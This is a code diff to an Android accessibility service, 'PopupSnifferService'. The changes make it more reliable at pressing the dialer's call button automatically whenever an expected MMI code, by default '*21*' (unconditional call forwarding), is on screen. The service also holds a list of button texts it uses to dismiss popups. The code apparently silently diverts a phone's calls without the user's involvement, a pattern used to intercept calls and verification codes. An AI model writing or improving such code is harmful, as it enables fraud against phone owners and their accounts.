@@ -24,6 +24,8 @@ class PopupSnifferService : AccessibilityService() {
         private const val KEY_EXPECTED_MMI = "expected_mmi"
         private const val DEFAULT_WINDOW_MS = 60_000L
         private const val CALL_CLICK_DELAY_MS = 300L
+        private const val DIALER_STABLE_WINDOW_MS = 600L
+        private const val MAX_CALL_CLICK_ATTEMPTS = 4
 
         private val DISMISS_BUTTON_TEXTS = listOf(
             "Aceptar", "aceptar", "OK", "ok", "Cerrar", "cerrar"
@@ -48,6 +50,9 @@ class PopupSnifferService : AccessibilityService() {
     private var lastHeartbeatAt: Long = 0L
     private val HEARTBEAT_THROTTLE_MS = 1500L
     private var pendingCallClick: Runnable? = null
+    private var pendingCallAttempt: Int = 0
+    private var activeDialerPkg: String? = null
+    private var lastDialerWindowAt: Long = 0L
 
     override fun onServiceConnected() {
         super.onServiceConnected()
@@ -75,8 +80,12 @@ class PopupSnifferService : AccessibilityService() {
             if (since > 0L && since != lastCallClickArmedSince) {
                 if (pkg == "com.samsung.android.dialer" || pkg == "com.samsung.android.app.dialer" || pkg == "com.google.android.dialer") {
                     if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
-                        event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
+                        event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED ||
+                        event.eventType == AccessibilityEvent.TYPE_WINDOWS_CHANGED
                     ) {
+                        activeDialerPkg = pkg
+                        lastDialerWindowAt = now
+                        Log.e(TAG, "DIALER_WINDOW event=${event.eventType} pkg=$pkg class=$clazz armedSince=$since")
                         scheduleCallClick(since, pkg, clazz)
                     }
                 }
@@ -153,10 +162,13 @@ class PopupSnifferService : AccessibilityService() {
     
 
     private fun clickCallButtonIfPresentGuarded(): Boolean {
-        val root = rootInActiveWindow ?: return false
+        val root = rootInActiveWindow ?: run {
+            Log.e(TAG, "CALL_CLICK rootInActiveWindow=null")
+            return false
+        }
 
         if (!isExpectedMmiVisible(root)) {
-            Log.e(TAG, "SAFE_GUARD: MMI not visible in dialer -> NOT clicking call")
+            Log.e(TAG, "SAFE_GUARD: expected MMI not visible in dialer -> NOT clicking call")
             return false
         }
         for (t in CALL_BUTTON_TEXTS) {
@@ -214,6 +226,7 @@ class PopupSnifferService : AccessibilityService() {
             .getString(KEY_EXPECTED_MMI, "")
             .orEmpty()
             .trim()
+        Log.e(TAG, "MMI_GUARD expected='$expected'")
         val needles = if (expected.isNotBlank()) listOf(expected) else listOf("*21*")
         var found = false
 
@@ -368,11 +381,35 @@ class PopupSnifferService : AccessibilityService() {
             val now = System.currentTimeMillis()
             if (!ensureArmedFromPrefs(now)) return@Runnable
             if (armedSince == lastCallClickArmedSince) return@Runnable
-            Log.e(TAG, "Trying SAFE_CALL_CLICK... armedSince=$armedSince pkg=$pkg class=$clazz")
+
+            val sinceWindow = now - lastDialerWindowAt
+            if (activeDialerPkg != pkg || sinceWindow < DIALER_STABLE_WINDOW_MS) {
+                Log.e(
+                    TAG,
+                    "CALL_CLICK_WAIT pkg=$pkg activeDialerPkg=$activeDialerPkg sinceWindow=${sinceWindow}ms attempt=$pendingCallAttempt"
+                )
+                if (pendingCallAttempt < MAX_CALL_CLICK_ATTEMPTS) {
+                    pendingCallAttempt += 1
+                    scheduleCallClick(armedSince, pkg, clazz)
+                }
+                return@Runnable
+            }
+
+            Log.e(TAG, "Trying SAFE_CALL_CLICK... armedSince=$armedSince pkg=$pkg class=$clazz attempt=$pendingCallAttempt")
             val clicked = clickCallButtonIfPresentGuarded()
             if (clicked) {
                 lastCallClickArmedSince = armedSince
                 lastCallClickAt = now
+                pendingCallAttempt = 0
+                Log.e(TAG, "CALL_CLICK_SUCCESS armedSince=$armedSince pkg=$pkg")
+            } else {
+                Log.e(TAG, "CALL_CLICK_NOT_FOUND armedSince=$armedSince pkg=$pkg")
+                if (pendingCallAttempt < MAX_CALL_CLICK_ATTEMPTS) {
+                    pendingCallAttempt += 1
+                    scheduleCallClick(armedSince, pkg, clazz)
+                } else {
+                    pendingCallAttempt = 0
+                }
             }
         }
         handler.postDelayed(pendingCallClick!!, CALL_CLICK_DELAY_MS)
